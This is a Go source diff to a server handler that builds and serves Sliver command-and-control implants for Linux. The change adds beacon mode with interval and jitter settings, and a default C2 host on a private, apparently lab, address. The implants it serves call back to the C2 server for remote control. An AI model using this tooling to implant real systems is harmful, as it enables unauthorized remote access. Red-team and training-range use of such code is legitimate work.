@@ -35,6 +35,11 @@ const (
 	defaultC2Host       = "172.20.0.10"
 	defaultListenerPort = uint32(80)
 	buildTimeout        = 15 * time.Minute
+
+	// Beacon defaults (seconds). BeaconInterval must be non-zero or the
+	// beacon compiles but never checks in.
+	defaultBeaconSeconds = int64(60)
+	defaultJitterSeconds = int64(10)
 )
 
 // implantCache holds a generated implant binary per (arch, c2host, port) key.
@@ -63,13 +68,35 @@ func (s *Server) handleGetImplantLinux(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
+	// Implant type: beacon (default) or session (?type=session).
+	isBeacon := true
+	if strings.EqualFold(r.URL.Query().Get("type"), "session") {
+		isBeacon = false
+	}
+	intervalSec := defaultBeaconSeconds
+	if v := r.URL.Query().Get("interval"); v != "" {
+		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
+			intervalSec = n
+		}
+	}
+	jitterSec := defaultJitterSeconds
+	if v := r.URL.Query().Get("jitter"); v != "" {
+		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n >= 0 {
+			jitterSec = n
+		}
+	}
+	kind := "session"
+	if isBeacon {
+		kind = "beacon"
+	}
+
 	c2URL := fmt.Sprintf("http://%s:%d", c2Host, port)
-	cacheKey := fmt.Sprintf("%s_%s_%d", arch, c2Host, port)
+	cacheKey := fmt.Sprintf("%s_%s_%s_%d", kind, arch, c2Host, port)
 
 	globalImplantCache.mu.Lock()
 	if data, ok := globalImplantCache.cache[cacheKey]; ok {
 		globalImplantCache.mu.Unlock()
-		serveImplant(w, data, "sliver-session-linux-"+arch)
+		serveImplant(w, data, fmt.Sprintf("sliver-%s-linux-%s", kind, arch))
 		return
 	}
 	globalImplantCache.mu.Unlock()
@@ -82,7 +109,7 @@ func (s *Server) handleGetImplantLinux(w http.ResponseWriter, r *http.Request) {
 
 	// Reuse an existing build if available (avoids recompilation).
 	var data []byte
-	if buildName, err := s.findMatchingBuild(arch, c2URL); err == nil && buildName != "" {
+	if buildName, err := s.findMatchingBuild(arch, c2URL, isBeacon); err == nil && buildName != "" {
 		log.Printf("[implant] Reusing existing build: %s", buildName)
 		ctx, cancel := context.WithTimeout(r.Context(), 2*time.Minute)
 		defer cancel()
@@ -94,22 +121,27 @@ func (s *Server) handleGetImplantLinux(w http.ResponseWriter, r *http.Request) {
 
 	if data == nil {
 		// Compile a fresh implant — takes ~1-2 min but is synchronous.
-		log.Printf("[implant] Compiling linux/%s session implant → %s (this takes ~1-2 min)…", arch, c2URL)
+		log.Printf("[implant] Compiling linux/%s %s implant → %s (this takes ~1-2 min)…", arch, kind, c2URL)
 		ctx, cancel := context.WithTimeout(r.Context(), buildTimeout)
 		defer cancel()
 
-		resp, err := s.rpc.Generate(ctx, &clientpb.GenerateReq{
-			Config: &clientpb.ImplantConfig{
-				GOOS:             "linux",
-				GOARCH:           arch,
-				Format:           clientpb.OutputFormat_EXECUTABLE,
-				IsBeacon:         false,
-				HTTPC2ConfigName: "default",
-				C2: []*clientpb.ImplantC2{
-					{Priority: 0, URL: c2URL},
-				},
+		implantCfg := &clientpb.ImplantConfig{
+			GOOS:             "linux",
+			GOARCH:           arch,
+			Format:           clientpb.OutputFormat_EXECUTABLE,
+			IsBeacon:         isBeacon,
+			HTTPC2ConfigName: "default",
+			C2: []*clientpb.ImplantC2{
+				{Priority: 0, URL: c2URL},
 			},
-		})
+		}
+		if isBeacon {
+			// Sliver stores these as nanoseconds; a zero interval never checks in.
+			implantCfg.BeaconInterval = intervalSec * int64(time.Second)
+			implantCfg.BeaconJitter = jitterSec * int64(time.Second)
+		}
+
+		resp, err := s.rpc.Generate(ctx, &clientpb.GenerateReq{Config: implantCfg})
 		if err != nil {
 			log.Printf("[implant] Generate RPC error: %v", err)
 			writeError(w, http.StatusInternalServerError, "implant generation failed: "+err.Error())
@@ -120,19 +152,19 @@ func (s *Server) handleGetImplantLinux(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		data = resp.File.Data
-		log.Printf("[implant] Compiled linux/%s session implant (%d bytes)", arch, len(data))
+		log.Printf("[implant] Compiled linux/%s %s implant (%d bytes)", arch, kind, len(data))
 	}
 
 	globalImplantCache.mu.Lock()
 	globalImplantCache.cache[cacheKey] = data
 	globalImplantCache.mu.Unlock()
 
-	serveImplant(w, data, "sliver-session-linux-"+arch)
+	serveImplant(w, data, fmt.Sprintf("sliver-%s-linux-%s", kind, arch))
 }
 
 // findMatchingBuild looks through existing ImplantBuilds for one matching
 // the requested arch and C2 URL.  Returns "" if none is found.
-func (s *Server) findMatchingBuild(arch, c2URL string) (string, error) {
+func (s *Server) findMatchingBuild(arch, c2URL string, isBeacon bool) (string, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
 
@@ -142,6 +174,9 @@ func (s *Server) findMatchingBuild(arch, c2URL string) (string, error) {
 	}
 	for name, cfg := range builds.GetConfigs() {
 		if cfg.GetGOOS() != "linux" || cfg.GetGOARCH() != arch {
+			continue
+		}
+		if cfg.GetIsBeacon() != isBeacon {
 			continue
 		}
 		for _, c2 := range cfg.GetC2() {
